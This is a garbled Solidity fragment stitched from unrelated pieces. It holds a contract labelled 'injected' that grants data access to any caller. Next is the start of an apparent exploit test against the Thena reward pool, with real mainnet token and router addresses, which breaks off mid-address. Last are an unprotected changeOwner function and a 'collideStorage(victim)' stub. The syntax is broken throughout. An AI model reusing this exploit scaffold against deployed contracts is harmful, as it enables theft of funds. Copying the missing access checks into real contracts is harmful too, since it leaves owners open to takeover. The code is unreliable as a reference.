
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IThenaRewardPool {
    function unstake(address,uint256,address,bool) external};
interface IVolatileV1 {
    function metadata() external view returns (uint dec0, uint dec1, uint r0, uint r1, bool st, address t0, address t1);
    function claimFees() external returns (uint, uint);
    function tokens() external view returns (address, address);
    function transferFrom(address src, address dst, uint amount) external returns (bool);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint amount0, uint amount1);
    function mint(address to) external returns (uint liquidity);
    function getReserves() external view returns (uint _reserve0, uint _reserve1, uint _blockTimestampLast);
    function getAmountOut(uint, address) external view returns (uint);
    function name() external view returns(string memory);
    function symbol() external view returns(string memory);
    function totalSupply() external view returns (uint);
    function decimals() external view returns (uint8);
    function claimable0(address _user) external view returns (uint);
    function claimable1(address _user) external view returns (uint);
    function isStable() external view returns(bool)};
contract ContractTest is Test {
    IERC20 THENA = IERC20(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
    IERC20 BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 wUSDR = IERC20(0x2952beb1326acCbB5243725bd4Da2fC937BCa087);
    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Router_V2 Router = Uni_Router_V2(0x20a304a7d126758dfe6B243D0fc515F83bCA8431);
    Uni_Pair_V2 USDC_BUSD = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F48
function changeOwner(address newOwner) public {
    owner = newOwner}
function collideStorage(address victim) public {
    address proxy;
    proxy = victim}